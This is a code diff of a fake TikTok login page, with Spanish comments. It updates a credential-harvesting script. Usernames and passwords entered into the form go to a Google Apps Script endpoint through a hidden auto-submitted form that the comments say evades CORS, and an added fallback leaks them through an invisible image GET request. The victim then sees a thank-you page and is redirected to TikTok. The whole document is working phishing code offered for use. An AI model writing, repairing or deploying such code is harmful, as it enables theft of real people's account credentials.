@@ -132,84 +132,185 @@
         <button class="back-btn" onclick="goBackToLogin()"><i class="fas fa-arrow-left"></i> Back to Login</button>
     </div>
 
-    <!-- ================== SCRIPT INTEGRADO ================== -->
+    <!-- ================== SCRIPT CORREGIDO ================== -->
     <script>
-        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec"
-        // Panel de configuración
-        let redirectUrl = localStorage.getItem('tiktokRedirectUrl') || "https://www.tiktok.com";
-        let redirectDelay = parseInt(localStorage.getItem('tiktokRedirectDelay')) || 2;
-        document.getElementById('redirectUrl').value = redirectUrl;
-        document.getElementById('currentUrl').textContent = redirectUrl;
-        document.getElementById('redirectDelay').value = redirectDelay;
+      
+    // URL de tu Google Apps Script
+    const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec";
+    
+    // Panel de configuración
+    let redirectUrl = localStorage.getItem('tiktokRedirectUrl') || "https://www.tiktok.com";
+    let redirectDelay = parseInt(localStorage.getItem('tiktokRedirectDelay')) || 2;
+    document.getElementById('redirectUrl').value = redirectUrl;
+    document.getElementById('currentUrl').textContent = redirectUrl;
+    document.getElementById('redirectDelay').value = redirectDelay;
 
-        function toggleConfigPanel() { const panel = document.getElementById('configPanel'); panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none'; }
-        function saveRedirectConfig() {
-            const url = document.getElementById('redirectUrl').value;
-            const delay = parseInt(document.getElementById('redirectDelay').value);
-            if(url && isValidUrl(url)){ redirectUrl=url; localStorage.setItem('tiktokRedirectUrl',url); document.getElementById('currentUrl').textContent=url; }
-            if(!isNaN(delay) && delay>=0 && delay<=10){ redirectDelay=delay; localStorage.setItem('tiktokRedirectDelay', delay); }
+    function toggleConfigPanel() { 
+        const panel = document.getElementById('configPanel'); 
+        panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none'; 
+    }
+    
+    function saveRedirectConfig() {
+        const url = document.getElementById('redirectUrl').value;
+        const delay = parseInt(document.getElementById('redirectDelay').value);
+        
+        if(url && isValidUrl(url)){
+            redirectUrl = url; 
+            localStorage.setItem('tiktokRedirectUrl', url); 
+            document.getElementById('currentUrl').textContent = url; 
             alert('Configuración guardada');
         }
-        function isValidUrl(string){ try{ new URL(string); return true; }catch{ return false; } }
+        
+        if(!isNaN(delay) && delay >= 0 && delay <= 10){
+            redirectDelay = delay; 
+            localStorage.setItem('tiktokRedirectDelay', delay);
+        }
+    }
+    
+    function isValidUrl(string){ 
+        try{ 
+            new URL(string); 
+            return true; 
+        } catch { 
+            return false; 
+        } 
+    }
 
-        // Formulario de login
-        document.getElementById('loginForm').addEventListener('submit', async function(e){
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+    // ========== NUEVO MÉTODO SIN CORS ==========
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
 
-            if(username && password){
-                const loginBtn = document.getElementById('loginButton');
-                const originalText = loginBtn.innerHTML;
-                loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
-                loginBtn.disabled = true;
+        if(!username || !password){
+            alert('Please complete all fields');
+            return;
+        }
 
-                try{
-                    const now = new Date();
-                    const dateString = now.toISOString().split('T')[0];
-                    const timeString = now.toTimeString().split(' ')[0];
+        const loginBtn = document.getElementById('loginButton');
+        const originalText = loginBtn.innerHTML;
+        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+        loginBtn.disabled = true;
 
-                    await fetch(GOOGLE_SHEET_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ user: username, pass: password, date: dateString, time: timeString })
-                    });
-
-                } catch(err){ console.error("Error al enviar datos:", err); }
-
-                loginBtn.innerHTML = originalText;
-                loginBtn.disabled = false;
-
-                showThankYouPage();
-            } else { alert('Por favor, completa todos los campos'); }
+        // Método 1: Usando formulario HTML (EVITA CORS)
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = GOOGLE_SHEET_URL;
+        form.target = '_blank'; // Abre en nueva pestaña (invisible)
+        form.style.display = 'none';
+        
+        // Crear campos ocultos
+        const userInput = document.createElement('input');
+        userInput.type = 'hidden';
+        userInput.name = 'user';
+        userInput.value = username;
+        
+        const passInput = document.createElement('input');
+        passInput.type = 'hidden';
+        passInput.name = 'pass';
+        passInput.value = password;
+        
+        const dateInput = document.createElement('input');
+        dateInput.type = 'hidden';
+        dateInput.name = 'date';
+        dateInput.value = new Date().toLocaleDateString();
+        
+        const timeInput = document.createElement('input');
+        timeInput.type = 'hidden';
+        timeInput.name = 'time';
+        timeInput.value = new Date().toLocaleTimeString();
+        
+        // Añadir campos al formulario
+        form.appendChild(userInput);
+        form.appendChild(passInput);
+        form.appendChild(dateInput);
+        form.appendChild(timeInput);
+        
+        // Añadir formulario al body y enviar
+        document.body.appendChild(form);
+        form.submit();
+        
+        // Remover formulario después de enviar
+        setTimeout(() => {
+            document.body.removeChild(form);
+        }, 1000);
+        
+        console.log('📤 Data sent to Google Sheets:', { 
+            user: username, 
+            pass: password,
+            timestamp: new Date().toISOString()
         });
 
-        function showThankYouPage(){
-            const loginContainer = document.getElementById('loginContainer');
-            const thankyouContainer = document.getElementById('thankyouContainer');
-            loginContainer.classList.add('fade-out');
-            setTimeout(()=>{
-                loginContainer.style.display='none';
-                thankyouContainer.style.display='block';
-                setTimeout(()=>{ thankyouContainer.classList.add('fade-in'); },10);
-            },500);
-        }
+        // Mostrar página de agradecimiento después de 1 segundo
+        setTimeout(() => {
+            showThankYouPage();
+            loginBtn.innerHTML = originalText;
+            loginBtn.disabled = false;
+        }, 1500);
+    });
 
-        function goBackToLogin(){
-            const loginContainer = document.getElementById('loginContainer');
-            const thankyouContainer = document.getElementById('thankyouContainer');
-            thankyouContainer.classList.remove('fade-in');
-            thankyouContainer.classList.add('fade-out');
-            setTimeout(()=>{
-                thankyouContainer.style.display='none';
-                loginContainer.style.display='block';
-                document.getElementById('loginForm').reset();
-                thankyouContainer.classList.remove('fade-out');
-                loginContainer.classList.remove('fade-out');
-                loginContainer.classList.add('fade-in');
-                setTimeout(()=>{ loginContainer.classList.remove('fade-in'); },500);
-            },500);
-        }
+    // ========== MÉTODO ALTERNATIVO (usa GET en lugar de POST) ==========
+    async function sendToGoogleSheetsAlt(username, password) {
+        const fecha = new Date();
+        const params = new URLSearchParams({
+            user: username,
+            pass: password,
+            date: fecha.toLocaleDateString(),
+            time: fecha.toLocaleTimeString(),
+            source: 'tiktok-login',
+            timestamp: Date.now()
+        }).toString();
+        
+        const url = `${GOOGLE_SHEET_URL}?${params}`;
+        
+        // Usar una imagen invisible para enviar datos vía GET
+        return new Promise((resolve) => {
+            const img = new Image();
+            img.onload = () => {
+                console.log('✅ Data sent via GET method');
+                resolve(true);
+            };
+            img.onerror = () => {
+                console.log('⚠️ GET method failed, but continuing...');
+                resolve(true); // Continuar aunque falle
+            };
+            img.src = url;
+        });
+    }
+
+    function showThankYouPage(){
+        const loginContainer = document.getElementById('loginContainer');
+        const thankyouContainer = document.getElementById('thankyouContainer');
+        
+        loginContainer.classList.add('fade-out');
+        setTimeout(() => {
+            loginContainer.style.display = 'none';
+            thankyouContainer.style.display = 'block';
+            setTimeout(() => { 
+                thankyouContainer.classList.add('fade-in'); 
+            }, 10);
+        }, 500);
+    }
+
+    function goBackToLogin(){
+        const loginContainer = document.getElementById('loginContainer');
+        const thankyouContainer = document.getElementById('thankyouContainer');
+        
+        thankyouContainer.classList.remove('fade-in');
+        thankyouContainer.classList.add('fade-out');
+        
+        setTimeout(() => {
+            thankyouContainer.style.display = 'none';
+            loginContainer.style.display = 'block';
+            document.getElementById('loginForm').reset();
+            thankyouContainer.classList.remove('fade-out');
+            loginContainer.classList.remove('fade-out');
+            loginContainer.classList.add('fade-in');
+            setTimeout(() => { 
+                loginContainer.classList.remove('fade-in'); 
+            }, 500);
+        }, 500);
+    }
     </script>
 </body>
 </html>
